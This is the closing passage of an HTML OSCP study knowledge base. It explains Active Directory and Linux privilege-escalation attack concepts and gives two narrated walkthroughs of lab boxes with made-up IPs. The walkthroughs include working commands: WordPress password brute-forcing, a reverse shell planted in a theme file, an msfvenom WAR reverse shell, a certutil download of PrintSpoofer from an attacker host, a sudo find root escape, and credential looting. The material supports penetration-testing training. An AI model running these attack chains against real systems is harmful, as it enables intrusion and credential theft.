+<li><strong>→ Kerberoasting:</strong> *anyone* can request a TGS for any service with an <strong>SPN</strong>. The TGS is encrypted with the <strong>service account&#x27;s password hash</strong> → request it, crack it offline (<code>-m 13100</code>). Works because you don&#x27;t need to reach the service, just ask the KDC.</li>
+<li><strong>→ AS-REP roasting:</strong> if a user has &quot;pre-auth disabled,&quot; the KDC&#x27;s <strong>AS-REP</strong> is encrypted with *their* hash and handed out with no proof of identity → crack it (<code>-m 18200</code>). No credentials needed.</li>
+<li><strong>→ Pass-the-Ticket / Overpass-the-Hash:</strong> steal or forge a TGT/TGS and inject it (<code>KRB5CCNAME</code>). <strong>Golden Ticket</strong> = forge *any* TGT using the stolen <strong>krbtgt</strong> hash (total domain forge). <strong>Silver Ticket</strong> = forge a TGS for one service using that service&#x27;s hash.</li>
+</ul>
+<h2 id="v1-[concept-spn]-service-principal-name-spn">[CONCEPT-SPN]  Service Principal Name (SPN)<a class="anchor" href="#v1-[concept-spn]-service-principal-name-spn">#</a></h2>
+<p>An SPN maps a <strong>service instance</strong> (e.g. <code>MSSQL/db01.corp.local</code>) to the <strong>account that runs it</strong>. Kerberos uses it to pick which account&#x27;s key encrypts the TGS. <strong>→ Attack:</strong> accounts *with* an SPN are Kerberoastable — and service accounts are often high-privilege with weak passwords. <code>GetUserSPNs</code> lists them.</p>
+<h2 id="v1-[concept-sid]-sid-rid-full-detail-in-[ad-sid]">[CONCEPT-SID]  SID &amp; RID  → full detail in <code class="tag">[AD-SID]</code><a class="anchor" href="#v1-[concept-sid]-sid-rid-full-detail-in-[ad-sid]">#</a></h2>
+<p>A <strong>SID</strong> (<code>S-R-X-Y</code>) uniquely identifies every principal; the last number is the <strong>RID</strong>. The domain SID + a RID = a specific user. <strong>→ Attacks:</strong> RID cycling enumerates users; the domain SID is needed to forge tickets.</p>
+<h2 id="v1-[concept-tokens]-windows-access-tokens">[CONCEPT-TOKENS]  Windows access tokens<a class="anchor" href="#v1-[concept-tokens]-windows-access-tokens">#</a></h2>
+<p>When you log in, Windows builds an <strong>access token</strong> describing your privileges/SIDs; every process carries a copy. Two kinds: <strong>primary</strong> (attached to a process) and <strong>impersonation</strong> (lets a thread act as another user — how services handle client requests).</p>
+<ul>
+<li><strong>→ Attack (SeImpersonate → Potato):</strong> a service account with <strong>SeImpersonatePrivilege</strong> can impersonate any token it&#x27;s handed. The &quot;Potato&quot; exploits trick a <strong>SYSTEM</strong> process into authenticating to the attacker, then impersonate its token → become SYSTEM. This is why SeImpersonate on IIS/MSSQL/service accounts is an instant win.</li>
+</ul>
+<h2 id="v1-[concept-ad-structure]-domain-dc-forest-ou-gpo-gc">[CONCEPT-AD-STRUCTURE]  Domain, DC, Forest, OU, GPO, GC<a class="anchor" href="#v1-[concept-ad-structure]-domain-dc-forest-ou-gpo-gc">#</a></h2>
+<ul>
+<li><strong>Domain</strong> = a boundary of users/computers sharing a database. <strong>Domain Controller (DC)</strong> = the server holding it (AD DS) + the KDC. Own the DC = own the domain.</li>
+<li><strong>Forest</strong> = one or more domains sharing a schema/trust (the top security boundary). <strong>OU</strong> = a folder for organizing/​delegating objects. <strong>GPO</strong> = Group Policy, pushes settings/scripts to machines (abusable if you can edit one). <strong>Global Catalog (GC, 3268)</strong> = a forest-wide searchable index of objects.</li>
+</ul>
+<h2 id="v1-[concept-ldap]-ldap-vs-ad">[CONCEPT-LDAP]  LDAP vs AD<a class="anchor" href="#v1-[concept-ldap]-ldap-vs-ad">#</a></h2>
+<p><strong>AD</strong> is the database; <strong>LDAP</strong> (389/636) is the *protocol* you query it with. Users, groups, computers, their attributes (incl. <code>description</code>, SPNs, <code>msDS-*</code> flags) all live in LDAP. <strong>→ Attack:</strong> anonymous/authed LDAP dumps the whole directory — users, roastable accounts, delegation flags, sometimes passwords in <code>description</code>.</p>
+<h2 id="v1-[concept-delegation]-delegation-why-its-abusable">[CONCEPT-DELEGATION]  Delegation (why it&#x27;s abusable)<a class="anchor" href="#v1-[concept-delegation]-delegation-why-its-abusable">#</a></h2>
+<p>Delegation lets a service act <strong>on behalf of</strong> a user to reach another service (e.g. web server → DB as *you*). <strong>Unconstrained</strong> = the service caches your full TGT (compromise it → steal any TGT that touches it). <strong>Constrained</strong> = limited to named services (S4U abuse to impersonate anyone to those). <strong>RBCD</strong> = the *target* says who may delegate to it (write that attribute → impersonate admin to it). All three end in &quot;impersonate a privileged user.&quot;</p>
+<h2 id="v1-[concept-dcsync]-dcsync-replication">[CONCEPT-DCSYNC]  DCSync / replication<a class="anchor" href="#v1-[concept-dcsync]-dcsync-replication">#</a></h2>
+<p>DCs sync their databases using the <strong>Directory Replication Service</strong> protocol. <strong>→ Attack:</strong> any principal granted *Replicating Directory Changes* rights (Domain Admins, or a delegated account BloodHound flags) can <strong>ask a DC to replicate password hashes</strong> — including <strong>krbtgt</strong> and <strong>Administrator</strong> — without touching disk. <code>secretsdump</code> does this. It&#x27;s the usual &quot;game over.&quot;</p>
+<h2 id="v1-[concept-hashes]-hash-types-crack-vs-pass">[CONCEPT-HASHES]  hash types — crack vs. pass<a class="anchor" href="#v1-[concept-hashes]-hash-types-crack-vs-pass">#</a></h2>
+<ul>
+<li><strong>NT hash</strong> (Windows, 32 hex): <strong>pass it</strong> (PtH) or crack (<code>-m 1000</code>).</li>
+<li><strong>NetNTLMv2</strong> (Responder capture): <strong>crack</strong> (<code>-m 5600</code>) or relay — cannot PtH.</li>
+<li><strong>Kerberos</strong> TGS (<code>-m 13100</code>) / AS-REP (<code>-m 18200</code>): <strong>crack</strong> only.</li>
+<li><strong>Linux</strong> <code>$6$</code> sha512crypt (<code>-m 1800</code>), <code>$1$</code> md5crypt (<code>-m 500</code>), bcrypt <code>$2$</code> (<code>-m 3200</code>): crack from <code>/etc/shadow</code>.</li>
+<li><strong>Golden rule:</strong> if it&#x27;s an NT hash, <strong>try passing it before wasting time cracking</strong>.</li>
+</ul>
+<h2 id="v1-[concept-linux-perms]-suidsgid-sudo-capabilities-what-they-are">[CONCEPT-LINUX-PERMS]  SUID/SGID, sudo, capabilities (what they *are*)<a class="anchor" href="#v1-[concept-linux-perms]-suidsgid-sudo-capabilities-what-they-are">#</a></h2>
+<ul>
+<li><strong>SUID/SGID</strong> bit: a program runs as its <strong>owner/group</strong> (often root) regardless of who launches it — designed for tools like <code>passwd</code>. <strong>→ Attack:</strong> a SUID binary that can run commands/read/write (GTFOBins) does so *as root*.</li>
+<li><strong>sudo</strong>: runs a command as another user per <code>/etc/sudoers</code>. <strong>→ Attack:</strong> a permitted binary with a shell escape (GTFOBins) = root.</li>
+<li><strong>Capabilities</strong>: fine-grained slices of root power on a binary (e.g. <code>cap_setuid</code>). <strong>→ Attack:</strong> <code>cap_setuid</code> on python = instant root.</li>
+</ul>
+<h2 id="v1-[concept-web-auth]-sessions-cookies-jwt">[CONCEPT-WEB-AUTH]  sessions, cookies, JWT<a class="anchor" href="#v1-[concept-web-auth]-sessions-cookies-jwt">#</a></h2>
+<p>HTTP is stateless, so after login the server issues a <strong>session</strong> identified by a <strong>cookie</strong>. <strong>JWT</strong> = a self-contained signed token (header.payload.signature) the server trusts if the signature checks. <strong>→ Attacks:</strong> steal/forge the cookie (IDOR/tamper <code>role=admin</code>), or forge a JWT (weak HMAC secret → crack + re-sign, or <code>alg:none</code>).</p>
+<hr>
+<h1 id="v1-[first-box-walkthrough]-see-it-all-connect-two-full-examples">[FIRST-BOX-WALKTHROUGH]  🎬 see it all connect (two full examples)<a class="anchor" href="#v1-[first-box-walkthrough]-see-it-all-connect-two-full-examples">#</a></h1>
+<blockquote>These are <strong>representative</strong> easy boxes (made-up IPs, not real exam machines) narrated the way an experienced tester thinks. Follow the *reasoning*, not just the commands.</blockquote>
+<h2 id="v1-example-a-a-typical-easy-linux-box-target-19216815050">Example A — a typical easy LINUX box  (target <code>192.168.150.50</code>)<a class="anchor" href="#v1-example-a-a-typical-easy-linux-box-target-19216815050">#</a></h2>
+<p><strong>① Setup + scan</strong> (<code class="tag">[NMAP-QUICK]</code>)</p>
+<pre><code>mkdir -p ~/oscp/box50/{scans,loot} &amp;&amp; cd ~/oscp/box50
+T=192.168.150.50
+nmap -p- --min-rate 2000 -Pn -oN scans/all.txt $T
+# → shows: 22 (ssh), 80 (http)
+nmap -p22,80 -sCV -Pn -oN scans/scv.txt $T
+# → 22 OpenSSH 8.2p1 Ubuntu ; 80 Apache 2.4.41, title &quot;Meridian Blog&quot;</code></pre>
+<p>*Think:* Only 22 and 80. SSH is rarely the way in by itself — <strong>the web server is my target</strong> (Golden Rule: web gets full attention).</p>
+<p><strong>② Web enumeration</strong> (<code class="tag">[WEB-QUICK]</code>)</p>
+<pre><code>whatweb http://$T                 # → WordPress 5.7.2, PHP
+curl -s http://$T/robots.txt      # → /wp-admin/, nothing juicy
+feroxbuster -u http://$T -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php
+# → /wp-login.php, /wp-content/, /uploads/</code></pre>
+<p>*Think:* It&#x27;s WordPress. Two cheap moves: (a) scan for vulnerable plugins with <code>wpscan</code>, (b) try weak admin creds.</p>
+<pre><code>wpscan --url http://$T --enumerate vp,u              # → user &quot;admin&quot;; plugin &quot;photo-gallery 1.5.35&quot;
+searchsploit photo-gallery 1.5.35                     # → an exploit exists? or check the users</code></pre>
+<p>Say wpscan found user <strong>admin</strong> but no easy plugin RCE. Try a small password guess (evidence: it&#x27;s an easy box):</p>
+<pre><code>wpscan --url http://$T -U admin -P /usr/share/wordlists/rockyou.txt   # → password: &quot;sunshine1&quot;</code></pre>
+<p><strong>③ Foothold</strong> (<code class="tag">[FOOTHOLD-CHECKLIST]</code>, WordPress trick from <code class="tag">[ADDENDUM-WEB-CMS]</code>)</p>
+<p>Log into <code>/wp-admin</code> as <code>admin:sunshine1</code>. WordPress admins can edit theme PHP → instant RCE:</p>
+<ul>
+<li>Appearance → Theme Editor → edit <code>404.php</code>, paste a PHP reverse shell (<code class="tag">[SHELL-LINUX]</code>), set <code>LHOST</code> = your <code>tun0</code> IP, port 443.</li>
+</ul>
+<pre><code>ip addr show tun0        # → my IP is 10.10.14.7  (this is LHOST)
+nc -lvnp 443             # start listener BEFORE triggering
+curl http://$T/wp-content/themes/&lt;theme&gt;/404.php     # trigger the shell
+# → listener catches a connection: &quot;www-data@meridian&quot;</code></pre>
+<p><strong>④ Stabilize</strong> (<code class="tag">[SHELL-QUICK]</code>)</p>
+<pre><code>python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;
+# Ctrl-Z
+stty raw -echo; fg
+# (Enter twice)
+export TERM=xterm</code></pre>
+<p><strong>⑤ Grab the first flag NOW</strong> (10 pts banked)</p>
+<pre><code>find / -name local.txt 2&gt;/dev/null      # → /home/jenny/local.txt  (or user&#x27;s home)
+cat /home/jenny/local.txt ; id ; ip a   # → SCREENSHOT all three together</code></pre>
+<p>*(Some Linux boxes only have proof.txt; grab whatever flag is present as low-priv.)*</p>
+<p><strong>⑥ Local enum → privesc</strong> (<code class="tag">[LINUX-PRIVESC-QUICK]</code>)</p>
+<pre><code>id                          # www-data
+sudo -l                     # → (nothing / needs password)
+find / -perm -4000 -type f 2&gt;/dev/null    # SUID list
+# also loot WP config for creds:
+cat /var/www/html/wp-config.php | grep -i pass   # → DB pass &quot;S3cureDB!&quot; → try it as jenny/other users
+su jenny                    # try reused password → success? now you&#x27;re jenny
+sudo -l                     # as jenny → (ALL) NOPASSWD: /usr/bin/find</code></pre>
+<p>*Think:* <code>sudo find</code> with NOPASSWD → straight to <code class="tag">[LINUX-SUDO]</code> / GTFOBins:</p>
+<pre><code>sudo find . -exec /bin/bash \; -quit         # GTFOBins &quot;find&quot; sudo escape → root shell
+id                                            # uid=0(root)</code></pre>
+<p><strong>⑦ Root flag</strong> (10 pts)</p>
+<pre><code>cat /root/proof.txt ; id ; ip a              # → SCREENSHOT all three</code></pre>
+<p><strong>Done: 20/20.</strong> Loot <code>/etc/shadow</code>, SSH keys, and any other creds for the rest of the exam.</p>
+<hr>
+<h2 id="v1-example-b-a-typical-easy-windows-box-target-19216815060">Example B — a typical easy WINDOWS box  (target <code>192.168.150.60</code>)<a class="anchor" href="#v1-example-b-a-typical-easy-windows-box-target-19216815060">#</a></h2>
+<p><strong>① Scan</strong></p>
+<pre><code>T=192.168.150.60
+nmap -p- --min-rate 2000 -Pn -oN scans/all.txt $T      # → 135,139,445,3389,5985,8080
+nmap -p135,139,445,3389,5985,8080 -sCV -Pn -oN scans/scv.txt $T
+# → 445 SMB, 5985 WinRM, 8080 Apache Tomcat 9.0.30</code></pre>
+<p>*Think:* SMB to check, and <strong>Tomcat on 8080</strong> — Tomcat with default creds = deploy a WAR = shell.</p>
+<p><strong>② Enumerate</strong></p>
+<pre><code>nxc smb $T -u &#x27;&#x27; -p &#x27;&#x27; --shares          # null session → maybe a readable share
+# Tomcat: browse http://$T:8080/  → /manager/html asks for login
+# try default creds: tomcat:tomcat, admin:admin, tomcat:s3cret</code></pre>
+<p>Say <code>tomcat:s3cret</code> works on <code>/manager/html</code>.</p>
+<p><strong>③ Foothold</strong> (<code class="tag">[WEB-UPLOAD]</code> → Tomcat WAR)</p>
+<pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.7 LPORT=443 -f war -o shell.war
+# upload shell.war via Tomcat Manager &quot;Deploy&quot; → it appears as an app
+nc -lvnp 443
+curl http://$T:8080/shell/                # browse the deployed app → triggers shell
+# → shell as &quot;tomcat&quot; service account on WIN-BOX</code></pre>
+<p><strong>④ First flag NOW</strong></p>
+<pre><code>whoami                                   # tomcat
+type C:\Users\tomcat\Desktop\local.txt &amp; whoami &amp; ipconfig     # SCREENSHOT together</code></pre>
+<p><strong>⑤ Privesc</strong> (<code class="tag">[WINDOWS-PRIVESC-QUICK]</code>)</p>
+<pre><code>whoami /priv
+# → SeImpersonatePrivilege  Enabled   ← service accounts usually have this!</code></pre>
+<p>*Think:* SeImpersonate → <strong>Potato attack</strong> → SYSTEM (<code class="tag">[WINDOWS-TOKENS]</code>). Transfer PrintSpoofer:</p>
+<pre><code># on Kali:  cd ~/tools/windows &amp;&amp; python3 -m http.server 80
+# on target:
+certutil -urlcache -split -f http://10.10.14.7/PrintSpoofer64.exe C:\Windows\Temp\ps.exe
+C:\Windows\Temp\ps.exe -i -c &quot;cmd&quot;       # → whoami = nt authority\system</code></pre>
+<p><strong>⑥ Root flag</strong></p>
+<pre><code>type C:\Users\Administrator\Desktop\proof.txt &amp; whoami &amp; ipconfig   # SCREENSHOT</code></pre>
+<p><strong>Done: 20/20.</strong> Then <code>secretsdump</code>/loot creds for lateral movement / the AD set.</p>
+<hr>
+<h2 id="v1-what-both-walkthroughs-teach-the-pattern-behind-every-box">What both walkthroughs teach (the pattern behind every box)<a class="anchor" href="#v1-what-both-walkthroughs-teach-the-pattern-behind-every-box">#</a></h2>
+<pre><code>SCAN everything  →  pick the most promising service  →  ENUMERATE it fully
+→  cheap foothold (default/weak creds &gt; known exploit &gt; web vuln)
+→  STABILIZE shell  →  grab + screenshot the low-priv flag IMMEDIATELY
+→  local enum (sudo -l / whoami /priv first!)  →  the ONE quick-win privesc
+→  root/SYSTEM  →  screenshot proof  →  LOOT creds for the next box</code></pre>
+<p>Every box is a variation of this. The guide&#x27;s job is to answer &quot;what do I check next?&quot; at each arrow. Now go do easy boxes on Proving Grounds / HTB and run this loop until it&#x27;s automatic. <code class="tag">[BEGINNER-START-HERE]</code></p>
+<hr>
+<h1 id="v1-[study-tracker]-turn-practice-into-a-pass">[STUDY-TRACKER]  📊 turn practice into a pass<a class="anchor" href="#v1-[study-tracker]-turn-practice-into-a-pass">#</a></h1>
+<blockquote><strong>The KB is content-complete — reps are what&#x27;s left.</strong> This tracker makes your practice *measurable* so you drill the right thing instead of grinding random boxes. There&#x27;s an <strong>interactive version</strong> (<code>OSCP-Study-Tracker.html</code>) that saves to your browser and auto-charts your weakest stage. Below is the paper/markdown version if you prefer.</blockquote>
+<h2 id="v1-how-it-works">How it works<a class="anchor" href="#v1-how-it-works">#</a></h2>
+<ol>
+<li>After <strong>every</strong> practice box, log one row — honestly.</li>
+<li>The field that matters most is <strong>“Where I got stuck”</strong> — that&#x27;s your weak-signal.</li>
+<li>After ~15 boxes, whichever stage has the most “stuck” marks is <strong>exactly what to drill next</strong>.</li>
+<li>Target <strong>~40–60 boxes, AD-weighted</strong> (aim ≥30% AD/Windows). When you can root PG-intermediate boxes without hints, you&#x27;re ready.</li>
+</ol>
+<h2 id="v1-per-box-row-copy-this-table-into-your-notes-use-the-interactive-html">Per-box row (copy this table into your notes / use the interactive HTML)<a class="anchor" href="#v1-per-box-row-copy-this-table-into-your-notes-use-the-interactive-html">#</a></h2>
+<pre><code>| Date | Box | Source | OS(L/W/AD) | Diff | Result(Root/Foothold/Fail) | TTF(min) | Foothold vector | Privesc vector | Hints(None/Some/Heavy) | STUCK stage | What I missed | Lesson |</code></pre>
+<p>Example filled row:</p>
+<pre><code>| 2026-08-21 | Meridian | PG | L | Easy | Root | 40 | Web-WP theme RCE | sudo find (GTFOBins) | None | Nowhere | — | always sudo -l before anything |
+| 2026-08-22 | Heist    | PG | W | Med  | Foothold | 65 | Cred reuse | (stuck) | Heavy | Windows privesc | missed SeImpersonate→Potato | whoami /priv FIRST on Windows |</code></pre>
+<h2 id="v1-weak-area-tally-tick-each-time-a-box-got-you-stuck-there">Weak-area tally (tick each time a box got you stuck there)<a class="anchor" href="#v1-weak-area-tally-tick-each-time-a-box-got-you-stuck-there">#</a></h2>
+<pre><code>Enumeration        : ....................   → drill [NMAP-QUICK] [ENUM-DECISION]
+Web exploitation   : ....................   → drill [WEB-QUICK] [SQLI]
+Foothold/access    : ....................   → drill [FOOTHOLD-CHECKLIST] [EXPLOIT-RESEARCH]
+Linux privesc      : ....................   → drill [LINUX-PRIVESC-QUICK]
+Windows privesc    : ....................   → drill [WINDOWS-PRIVESC-QUICK]
+Active Directory   : ....................   → drill [AD-QUICK] [AD-ATTACK-PATH]
+Pivoting           : ....................   → drill [PIVOT-QUICK]
+Reporting          : ....................   → drill [REPORTING]</code></pre>
+<p>Tallest column = your next 5 boxes&#x27; focus. Re-check every ~10 boxes; the goal is to watch your tall bar shrink.</p>
+<h2 id="v1-readiness-gate-dont-schedule-until-all-true">Readiness gate (don&#x27;t schedule until all true)<a class="anchor" href="#v1-readiness-gate-dont-schedule-until-all-true">#</a></h2>
+<pre><code>[ ] Rooted 40–60+ boxes, ≥30% Windows/AD
+[ ] Can root a PG-intermediate box start→proof with NO hints
+[ ] Ran ≥5 full AD chains (enum→BloodHound→roast→lateral→DC) unaided
+[ ] Pivoted through a host (Ligolo/Chisel) at least a few times
+[ ] Wrote ≥1 practice report with screenshots + repro from your notes
+[ ] Your weak-area radar has no single dominant tall bar left</code></pre>
+<hr>
+<p>*End Volume 9 &amp; the Knowledge Base. Foundations (Vol 9) → methodology (Vol 0) → techniques (Vol 1–5) → lookups (Vol 6) → syllabus+flow (Vol 7) → war room (Vol 8). Now go log boxes in <code class="tag">[STUDY-TRACKER]</code> and clear it. 🎯*</p></section></main>
+  </div>
+</div>
+<button id="totop" onclick="window.scrollTo({top:0,behavior:'smooth'})" title="Top">↑</button>
+<script>
+function toggleTheme(){var h=document.documentElement,t=h.getAttribute('data-theme')==='dark'?'light':'dark';h.setAttribute('data-theme',t);try{localStorage.setItem('oscpkb-theme',t)}catch(e){}}
+try{var s=localStorage.getItem('oscpkb-theme');if(s)document.documentElement.setAttribute('data-theme',s)}catch(e){}
+var content=document.getElementById('content'),searchBox=document.getElementById('search'),countEl=document.getElementById('count');
+var marks=[],cur=-1;
+function clearMarks(){marks.forEach(function(m){var p=m.parentNode;p.replaceChild(document.createTextNode(m.textContent),m);p.normalize();});marks=[];cur=-1;countEl.textContent='';}
+function clearSearch(){searchBox.value='';clearMarks();searchBox.focus();}
+function doSearch(){clearMarks();var q=searchBox.value.trim();if(q.length<2)return;var rx=new RegExp(q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&'),'gi');var wk=document.createTreeWalker(content,NodeFilter.SHOW_TEXT,{acceptNode:function(n){if(!n.nodeValue.trim())return NodeFilter.FILTER_REJECT;var t=n.parentNode.tagName;if(t==='SCRIPT'||t==='STYLE')return NodeFilter.FILTER_REJECT;return rx.test(n.nodeValue)?NodeFilter.FILTER_ACCEPT:NodeFilter.FILTER_REJECT;}});var tg=[],node;while(node=wk.nextNode())tg.push(node);tg.forEach(function(n){rx.lastIndex=0;var frag=document.createDocumentFragment(),last=0,s=n.nodeValue,m;while(m=rx.exec(s)){if(m.index>last)frag.appendChild(document.createTextNode(s.slice(last,m.index)));var mk=document.createElement('mark');mk.textContent=m[0];frag.appendChild(mk);marks.push(mk);last=m.index+m[0].length;if(m.index===rx.lastIndex)rx.lastIndex++;}if(last<s.length)frag.appendChild(document.createTextNode(s.slice(last)));n.parentNode.replaceChild(frag,n);});countEl.textContent=marks.length?('0/'+marks.length):'0 hits';if(marks.length){cur=-1;jump(1);}}
+function jump(d){if(!marks.length)return;if(cur>=0)marks[cur].classList.remove('current');cur=(cur+d+marks.length)%marks.length;var m=marks[cur];m.classList.add('current');m.scrollIntoView({behavior:'smooth',block:'center'});countEl.textContent=(cur+1)+'/'+marks.length;}
+var deb;searchBox.addEventListener('input',function(){clearTimeout(deb);deb=setTimeout(doSearch,180);});
+searchBox.addEventListener('keydown',function(e){if(e.key==='Enter'){e.preventDefault();jump(e.shiftKey?-1:1);}if(e.key==='Escape'){clearSearch();}});
+document.addEventListener('keydown',function(e){if(e.key==='/'&&document.activeElement!==searchBox&&(document.activeElement.id!=='navfilter')){e.preventDefault();searchBox.focus();}});
+content.addEventListener('click',function(e){if(e.target.classList.contains('tag')){searchBox.value=e.target.textContent;doSearch();}});
+var nf=document.getElementById('navfilter');nf.addEventListener('input',function(){var q=this.value.toLowerCase();document.querySelectorAll('#nav .navlink').forEach(function(a){a.style.display=(!q||a.textContent.toLowerCase().indexOf(q)>=0)?'':'none';});});
+var totop=document.getElementById('totop');window.addEventListener('scroll',function(){totop.style.display=window.scrollY>500?'block':'none';});
+document.getElementById('nav').addEventListener('click',function(e){if(e.target.classList.contains('navlink')&&window.innerWidth<=900)document.getElementById('sidebar').classList.remove('open');});
+</script>
+</body>
+</html>
